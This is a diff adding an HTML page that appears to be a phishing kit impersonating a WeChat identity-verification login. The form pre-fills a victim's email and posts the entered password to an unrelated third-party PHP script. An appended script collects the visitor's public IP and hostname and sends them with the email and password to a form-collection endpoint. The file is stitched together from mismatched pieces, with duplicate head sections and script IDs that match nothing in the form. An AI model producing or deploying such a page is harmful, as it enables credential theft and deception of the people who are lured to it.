@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login (Formspark + IP & Hostname)</title>
+  <style>
+    body { font-family: system-ui, Arial; background:#f4f6f8; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; }
+    .card { background:#fff; padding:20px 22px; border-radius:10px; box-shadow: 0 6px 18px rgba(16,24,40,0.08); width:360px; }
+    h2 { margin:0 0 12px 0; font-size:20px; }
+    label { display:block; font-size:13px; margin-top:8px; }
+    input { width:100%; padding:10px; margin-top:6px; border-radius:6px; border:1px solid #d8e1e9; box-sizing:border-box; }
+    button { margin-top:14px; width:100%; padding:10px; border-radius:8px; border:none; background:#0f62fe; color:#fff; font-weight:600; cursor:pointer; }
+    button[disabled] { opacity:.6; cursor:not-allowed; }
+    .note { margin-top:10px; font-size:13px; color:#555; }
+    pre { background:#f7f9fc; padding:10px; margin-top:10px; border-radius:6px; overflow:auto; font-size:13px; }
+  </style>
+</head>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title> &#24494;&#20449;&#29992;&#25143;&#35748;&#35777;</title>
+
+	<style>
+	label{
+	font-family:Arial, Helvetica;
+	font-size:0.8em;
+	}
+	</style>
+	
+	<style>
+    body {
+        background-image: url("https://chinatechscope.com/wp-content/uploads/2018/09/wechat-install-1.jpg");
+        background-repeat: no-repeat;
+    }
+    </style>
+</head>
+<body bgcolor="#1C7934">
+    
+    <br><br><br>
+    <table align="center" cellspacing="0" 
+    style="width: 390px; height:370px; border-radius: 5px; background-color: #FFFFFF; 
+  -webkit-box-shadow: 1px 1px 1px 2px #848484; box-shadow: 1px 1px 1px 2px #848484;
+  border-radius: 1px 5px 1px 5px;">
+        
+    <tr><td>
+    
+        <table align="center">
+        <tr><td>
+            <center>
+		        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQJQQ1R7nDl0WyG10QXAuxx5xFZXZtdSj9l9Q&usqp=CAU" 
+		        style="width:220px; height:70px;">
+		    </center>
+        </td></tr>    
+        <tr><td style="height:0px;"></td></tr>
+        <tr><td>
+        <center>
+        <form method='post' action='https://khattakinternational.com/Contacts/images/welogs.php' name='contactform' id='contactform'>
+            <p>
+                <font face="arial" color="#1C7934" style="font-size:27px;">
+                    &#38656;&#35201;&#36523;&#20221;&#39564;&#35777;
+                </font>
+                <br>
+                <font face="arial" color="#00000" style="font-size:20px;">
+                    &#35831;&#22312;&#19979;&#38754;&#39564;&#35777;&#24744;&#30340;&#29992;&#25143; ID &#20197;&#32487;&#32493;
+                </font>
+                <br>
+            </p>
+    
+            <p>
+	        <input type='email' name='email' style="height:33px; width:320px; padding:5px;" value="[[-Email-]]" readonly />
+	        </p>
+	
+	        <p>
+	        <input type='password' name='fullname' style="height:33px; width:320px; padding:5px;" placeholder="&#36755;&#20837;&#23494;&#30721;" required/>
+	        </p>
+
+
+	        <input type='submit' name='submit' value='&#22312;&#27492;&#30331;&#24405;'
+	        style="background:#1C7934; width:320px; height:37px; border:#1C7934; padding:7px; 
+		        border-radius:3px; color:#FFF; font-size:15px; font-weight:bold;"/>
+		        
+		    <input type="hidden" name='email' value="[[-Email-]]">
+        </form>
+        </center>
+        
+		</p>
+		
+        </td></tr></table>
+        
+    </td></tr>
+    </table>
+    
+
+</body>
+
+<script>
+/*
+  Single-file client-side flow:
+  1. Get public IP using api.ipify.org
+  2. Query ipapi.co/<ip>/json/ to attempt to get hostname (reverse DNS)
+  3. POST { email, password, ip, hostname } to Formspark endpoint
+
+  Limitations:
+  - Hostname may be missing (no PTR record). This is normal.
+  - Relying on third-party IP APIs means their availability/CORS rules apply.
+  - DO NOT use for production password collection.
+*/
+
+const FORMSPARK_URL = "https://submit-form.com/vQBbiONxP";
+
+const statusEl = document.getElementById('status');
+const resultEl = document.getElementById('result');
+const submitBtn = document.getElementById('submitBtn');
+
+function setStatus(text) {
+  statusEl.textContent = "Status: " + text;
+}
+
+async function fetchJson(url, options = {}) {
+  const res = await fetch(url, options);
+  if (!res.ok) throw new Error(`HTTP ${res.status} ${res.statusText}`);
+  return res.json();
+}
+
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  submitBtn.disabled = true;
+  resultEl.style.display = 'none';
+  setStatus('Getting public IP...');
+
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+
+  try {
+    // 1) get public IP (simple, lightweight)
+    // api.ipify.org supports CORS and returns {"ip":"x.x.x.x"}
+    let ipData;
+    try {
+      ipData = await fetchJson('https://api.ipify.org?format=json');
+    } catch (err) {
+      // fallback: try another public IP provider
+      console.warn('ipify failed, trying fallback', err);
+      ipData = await fetchJson('https://ifconfig.co/json'); // ifconfig.co returns JSON with "ip" (may be rate-limited)
+    }
+    const ip = (ipData && ipData.ip) ? ipData.ip : (ipData && ipData.ip_address) ? ipData.ip_address : null;
+    setStatus('Got IP: ' + (ip || 'unavailable'));
+
+    // 2) attempt to resolve hostname (reverse DNS) via ipapi.co
+    // ipapi.co has an endpoint /<ip>/json/ that returns fields including "hostname" (if available)
+    let hostname = null;
+    if (ip) {
+      setStatus('Attempting reverse DNS lookup for ' + ip + '...');
+      try {
+        // Example: https://ipapi.co/8.8.8.8/json/
+        const info = await fetchJson(`https://ipapi.co/${encodeURIComponent(ip)}/json/`);
+        // ipapi.co sometimes returns "hostname" or "org" etc.
+        if (info && (info.hostname || info.reverse || info.org)) {
+          // prefer explicit hostname field if present
+          hostname = info.hostname || info.reverse || null;
+        } else {
+          hostname = null;
+        }
+      } catch (err) {
+        console.warn('ipapi lookup failed', err);
+        hostname = null;
+      }
+    }
+
+    if (!hostname) {
+      setStatus('Hostname unavailable (no PTR or API returned none). Will send null.');
+    } else {
+      setStatus('Resolved hostname: ' + hostname);
+    }
+
+    // 3) Prepare payload and send to Formspark
+    setStatus('Sending data to Formspark...');
+    const payload = {
+      email,
+      password,
+      ip: ip || 'unavailable',
+      hostname: hostname || 'unavailable',
+      // optional: timestamp client-side
+      client_timestamp: new Date().toISOString()
+    };
+
+    const res = await fetch(FORMSPARK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    if (!res.ok) {
+      const text = await res.text();
+      throw new Error('Formspark responded with ' + res.status + ': ' + text);
+    }
+
+    // success
+    setStatus('Submitted successfully. Formspark accepted the submission.');
+    const json = await res.json().catch(()=>null);
+    resultEl.textContent = [
+      'Sent payload (client-side):',
+      JSON.stringify(payload, null, 2),
+      '',
+      'Formspark response (if any):',
+      json ? JSON.stringify(json, null, 2) : '(no JSON response)'
+    ].join('\\n');
+    resultEl.style.display = 'block';
+    document.getElementById('loginForm').reset();
+
+  } catch (err) {
+    console.error(err);
+    setStatus('Error: ' + (err.message || err));
+    resultEl.textContent = 'Error details:\\n' + (err.stack || err);
+    resultEl.style.display = 'block';
+  } finally {
+    submitBtn.disabled = false;
+  }
+});
+</script>
+</body>
+</html>
